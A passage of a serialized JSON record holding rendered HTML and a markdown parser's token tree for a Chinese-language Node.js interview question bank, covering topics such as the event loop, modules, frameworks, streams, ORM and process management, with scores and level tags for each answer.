分）</h4>\\n<p>Node.js的模块化有以下几种方法：</p>\\n<ul>\\n<li><p>CommonJS模块化：使用<code>require</code>和<code>module.exports</code>进行模块导入和导出。</p>\\n</li>\\n<li><p>ES6模块化：使用<code>import</code>和<code>export</code>进行模块导入和导出。</p>\\n</li>\\n<li><p>AMD模块化：使用<code>define</code>和<code>require</code>进行模块导入和导出。</p>\\n</li>\\n<li><p>UMD模块化：兼容CommonJS和AMD模块化。</p>\\n</li>\\n<li><p>全局变量：将变量挂载到<code>global</code>对象上，方便全局访问。</p>\\n</li>\\n<li><p>命名空间：将变量挂载到命名空间对象上，避免全局变量污染。</p>\\n</li>\\n<li><p>模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。</p>\\n</li>\\n</ul>\\n<h2>6. 讲一下常见的Nodejs框架？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。</p>\\n</li>\\n<li><p>Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。</p>\\n</li>\\n<li><p>Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。</p>\\n</li>\\n<li><p>Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。</p>\\n</li>\\n</ul>\\n<h2>7. Nodejs的异步编程有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的异步编程有以下几种方法：</p>\\n<ul>\\n<li><p>回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。</p>\\n</li>\\n<li><p>Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。</p>\\n</li>\\n<li><p>async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。</p>\\n</li>\\n<li><p>Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。</p>\\n</li>\\n<li><p>流程控制库：如<code>async</code>、<code>bluebird</code>、<code>co</code>等库，提供了更方便的异步编程方式。</p>\\n</li>\\n<li><p>事件驱动：通过事件驱动的方式处理异步操作，如<code>EventEmitter</code>、<code>Stream</code>等。</p>\\n</li>\\n</ul>\\n<h2>8. Nodejs的文件系统有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的文件系统有以下几种方法：</p>\\n<ul>\\n<li><p><code>fs.readFile</code>：读取文件内容。</p>\\n</li>\\n<li><p><code>fs.writeFile</code>：写入文件内容。</p>\\n</li>\\n<li><p><code>fs.appendFile</code>：追加文件内容。</p>\\n</li>\\n<li><p><code>fs.unlink</code>：删除文件。</p>\\n</li>\\n<li><p><code>fs.rename</code>：重命名文件。</p>\\n</li>\\n<li><p><code>fs.stat</code>：获取文件信息。</p>\\n</li>\\n<li><p><code>fs.readdir</code>：读取目录内容。</p>\\n</li>\\n<li><p><code>fs.mkdir</code>：创建目录。</p>\\n</li>\\n<li><p><code>fs.rmdir</code>：删除目录。</p>\\n</li>\\n<li><p><code>fs.watch</code>：监听文件或目录的变化。</p>\\n</li>\\n</ul>\\n<h2>9. 什么是Stream流，有哪些应用场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。</p>\\n</li>\\n<li><p>比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。</p>\\n</li>\\n</ul>\\n<h2>10. 什么是BFF？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。</p>\\n</li>\\n<li><p>最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。</p>\\n</li>\\n</ul>\\n<h2>11. 什么是ORM？Nodejs的ORM框架有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。</p>\\n</li>\\n<li><p>这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。</p>\\n</li>\\n<li><p>Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。</p>\\n</li>\\n</ul>\\n<h2>12. 什么是微服务？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。</p>\\n</li>\\n<li><p>微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。</p>\\n</li>\\n</ul>\\n<h2>13. 请介绍一下require的模块加载机制？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>先计算模块路径</p>\\n</li>\\n<li><p>如果模块在缓存里面，取出缓存</p>\\n</li>\\n<li><p>如果是内置模块，取出内置模块</p>\\n</li>\\n<li><p>加载模块</p>\\n</li>\\n<li><p>输出模块的exports属性即可</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Node\\n\\n","depth":1,"text":"Node","tokens":[{"type":"text","raw":"Node","text":"Node","escaped":false}]},{"type":"heading","raw":"## 1. Nodejs适用于哪些场景？\\n\\n","depth":2,"text":"1. Nodejs适用于哪些场景？","tokens":[{"type":"text","raw":"1. Nodejs适用于哪些场景？","text":"1. Nodejs适用于哪些场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n\\n- BFF开发，比如SSR中间层或者GraphQL中间层。\\n\\n- 前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n\\n","task":false,"loose":true,"text":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n","tokens":[{"type":"text","raw":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n","text":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。","tokens":[{"type":"text","raw":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。","text":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。","escaped":false}]}]},{"type":"list_item","raw":"- BFF开发，比如SSR中间层或者GraphQL中间层。\\n\\n","task":false,"loose":true,"text":"BFF开发，比如SSR中间层或者GraphQL中间层。\\n","tokens":[{"type":"text","raw":"BFF开发，比如SSR中间层或者GraphQL中间层。\\n","text":"BFF开发，比如SSR中间层或者GraphQL中间层。","tokens":[{"type":"text","raw":"BFF开发，比如SSR中间层或者GraphQL中间层。","text":"BFF开发，比如SSR中间层或者GraphQL中间层。","escaped":false}]}]},{"type":"list_item","raw":"- 前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","task":false,"loose":true,"text":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","tokens":[{"type":"text","raw":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","text":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","tokens":[{"type":"text","raw":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","text":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. Nodejs的事件循环和浏览器有什么区别？\\n\\n","depth":2,"text":"2. Nodejs的事件循环和浏览器有什么区别？","tokens":[{"type":"text","raw":"2. Nodejs的事件循环和浏览器有什么区别？","text":"2. Nodejs的事件循环和浏览器有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","text":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","tokens":[{"type":"text","raw":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","text":"Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n\\n- I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n\\n- idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n\\n- poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n\\n- check阶段：执行setImmediate()的回调函数。\\n\\n- close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n\\n","task":false,"loose":true,"text":"timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n","tokens":[{"type":"text","raw":"timers阶段：处理setTimeout()和setInterval()等定时器事件。\\n","text":"timers阶段：处理setTimeout()和setInterval()等定时器事件。","tokens":[{"type":"text","raw":"timers阶段：处理setTimeout()和setInterval()等定时器事件。","text":"timers阶段：处理setTimeout()和setInterval()等定时器事件。","escaped":false}]}]},{"type":"list_item","raw":"- I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n\\n","task":false,"loose":true,"text":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n","tokens":[{"type":"text","raw":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。\\n","text":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。","tokens":[{"type":"text","raw":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。","text":"I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。","escaped":false}]}]},{"type":"list_item","raw":"- idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n\\n","task":false,"loose":true,"text":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n","tokens":[{"type":"text","raw":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。\\n","text":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。","tokens":[{"type":"text","raw":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。","text":"idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。","escaped":false}]}]},{"type":"list_item","raw":"- poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n\\n","task":false,"loose":true,"text":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n","tokens":[{"type":"text","raw":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。\\n","text":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。","tokens":[{"type":"text","raw":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。","text":"poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。","escaped":false}]}]},{"type":"list_item","raw":"- check阶段：执行setImmediate()的回调函数。\\n\\n","task":false,"loose":true,"text":"check阶段：执行setImmediate()的回调函数。\\n","tokens":[{"type":"text","raw":"check阶段：执行setImmediate()的回调函数。\\n","text":"check阶段：执行setImmediate()的回调函数。","tokens":[{"type":"text","raw":"check阶段：执行setImmediate()的回调函数。","text":"check阶段：执行setImmediate()的回调函数。","escaped":false}]}]},{"type":"list_item","raw":"- close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","task":false,"loose":true,"text":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","tokens":[{"type":"text","raw":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","text":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","tokens":[{"type":"text","raw":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","text":"close callbacks阶段：执行关闭事件的回调函数，例如socket.on(\'close\')。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. Nodejs的内存泄漏排查方法有哪些？\\n\\n","depth":2,"text":"3. Nodejs的内存泄漏排查方法有哪些？","tokens":[{"type":"text","raw":"3. Nodejs的内存泄漏排查方法有哪些？","text":"3. Nodejs的内存泄漏排查方法有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的内存泄漏排查方法有以下几种：","text":"Node.js的内存泄漏排查方法有以下几种：","tokens":[{"type":"text","raw":"Node.js的内存泄漏排查方法有以下几种：","text":"Node.js的内存泄漏排查方法有以下几种：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n\\n- 使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n\\n- 使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n\\n- 使用代码审查和静态分析工具，如ESLint、JSHint等。\\n\\n- 使用单元测试和集成测试，确保代码的正确性和稳定性。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n\\n","task":false,"loose":true,"text":"使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n","tokens":[{"type":"text","raw":"使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。\\n","text":"使用Node.js自带的内存分析工具，如`process.memoryUsage()`和`heapdump`模块。","tokens":[{"type":"text","raw":"使用Node.js自带的内存分析工具，如","text":"使用Node.js自带的内存分析工具，如","escaped":false},{"type":"codespan","raw":"`process.memoryUsage()`","text":"process.memoryUsage()"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`heapdump`","text":"heapdump"},{"type":"text","raw":"模块。","text":"模块。","escaped":false}]}]},{"type":"list_item","raw":"- 使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n\\n","task":false,"loose":true,"text":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n","tokens":[{"type":"text","raw":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。\\n","text":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。","tokens":[{"type":"text","raw":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。","text":"使用第三方内存分析工具，如Chrome DevTools、VisualVM等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n\\n","task":false,"loose":true,"text":"使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n","tokens":[{"type":"text","raw":"使用内存泄漏检测工具，如`leak`、`memwatch`等。\\n","text":"使用内存泄漏检测工具，如`leak`、`memwatch`等。","tokens":[{"type":"text","raw":"使用内存泄漏检测工具，如","text":"使用内存泄漏检测工具，如","escaped":false},{"type":"codespan","raw":"`leak`","text":"leak"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`memwatch`","text":"memwatch"},{"type":"text","raw":"等。","text":"等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用代码审查和静态分析工具，如ESLint、JSHint等。\\n\\n","task":false,"loose":true,"text":"使用代码审查和静态分析工具，如ESLint、JSHint等。\\n","tokens":[{"type":"text","raw":"使用代码审查和静态分析工具，如ESLint、JSHint等。\\n","text":"使用代码审查和静态分析工具，如ESLint、JSHint等。","tokens":[{"type":"text","raw":"使用代码审查和静态分析工具，如ESLint、JSHint等。","text":"使用代码审查和静态分析工具，如ESLint、JSHint等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用单元测试和集成测试，确保代码的正确性和稳定性。","task":false,"loose":true,"text":"使用单元测试和集成测试，确保代码的正确性和稳定性。","tokens":[{"type":"text","raw":"使用单元测试和集成测试，确保代码的正确性和稳定性。","text":"使用单元测试和集成测试，确保代码的正确性和稳定性。","tokens":[{"type":"text","raw":"使用单元测试和集成测试，确保代码的正确性和稳定性。","text":"使用单元测试和集成测试，确保代码的正确性和稳定性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. Nodejs的进程管理有哪些方法？\\n\\n","depth":2,"text":"4. Nodejs的进程管理有哪些方法？","tokens":[{"type":"text","raw":"4. Nodejs的进程管理有哪些方法？","text":"4. Nodejs的进程管理有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的进程管理有以下几种方法：","text":"Node.js的进程管理有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的进程管理有以下几种方法：","text":"Node.js的进程管理有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n\\n- 使用`cluster`模块创建集群，利用多核CPU资源。\\n\\n- 使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n\\n- 使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n\\n- 使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n\\n","task":false,"loose":true,"text":"使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n","tokens":[{"type":"text","raw":"使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。\\n","text":"使用`child_process`模块创建子进程，并使用`process`模块进行进程间通信。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`child_process`","text":"child_process"},{"type":"text","raw":"模块创建子进程，并使用","text":"模块创建子进程，并使用","escaped":false},{"type":"codespan","raw":"`process`","text":"process"},{"type":"text","raw":"模块进行进程间通信。","text":"模块进行进程间通信。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`cluster`模块创建集群，利用多核CPU资源。\\n\\n","task":false,"loose":true,"text":"使用`cluster`模块创建集群，利用多核CPU资源。\\n","tokens":[{"type":"text","raw":"使用`cluster`模块创建集群，利用多核CPU资源。\\n","text":"使用`cluster`模块创建集群，利用多核CPU资源。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`cluster`","text":"cluster"},{"type":"text","raw":"模块创建集群，利用多核CPU资源。","text":"模块创建集群，利用多核CPU资源。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n\\n","task":false,"loose":true,"text":"使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n","tokens":[{"type":"text","raw":"使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。\\n","text":"使用`pm2`等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`pm2`","text":"pm2"},{"type":"text","raw":"等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。","text":"等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n\\n","task":false,"loose":true,"text":"使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n","tokens":[{"type":"text","raw":"使用`forever`等第三方工具，如自动重启、日志管理等功能。\\n","text":"使用`forever`等第三方工具，如自动重启、日志管理等功能。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`forever`","text":"forever"},{"type":"text","raw":"等第三方工具，如自动重启、日志管理等功能。","text":"等第三方工具，如自动重启、日志管理等功能。","escaped":false}]}]},{"type":"list_item","raw":"- 使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","task":false,"loose":true,"text":"使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","tokens":[{"type":"text","raw":"使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","text":"使用`node-mac`等第三方工具，如自动重启、日志管理等功能。","tokens":[{"type":"text","raw":"使用","text":"使用","escaped":false},{"type":"codespan","raw":"`node-mac`","text":"node-mac"},{"type":"text","raw":"等第三方工具，如自动重启、日志管理等功能。","text":"等第三方工具，如自动重启、日志管理等功能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. Nodejs的模块化有哪些方法？\\n\\n","depth":2,"text":"5. Nodejs的模块化有哪些方法？","tokens":[{"type":"text","raw":"5. Nodejs的模块化有哪些方法？","text":"5. Nodejs的模块化有哪些方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js的模块化有以下几种方法：","text":"Node.js的模块化有以下几种方法：","tokens":[{"type":"text","raw":"Node.js的模块化有以下几种方法：","text":"Node.js的模块化有以下几种方法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- CommonJS模块化：使用`require`和`module.exports`进行模块导入和导出。\\n\\n- ES6模块化：使用`import`和`export`进行模块导入和导出。\\n\\n- AMD模块化：使用`define`和`require`进行模块导入和导出。\\n\\n- UMD模块化：兼容CommonJS和AMD模块化。\\n\\n- 全局变量：将变量挂载到`global`对象上，方便全局访问。\\n\\n- 命名空间：将变量挂载到命名空间对象上，避免全局变量污染。\\n\\n- 模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 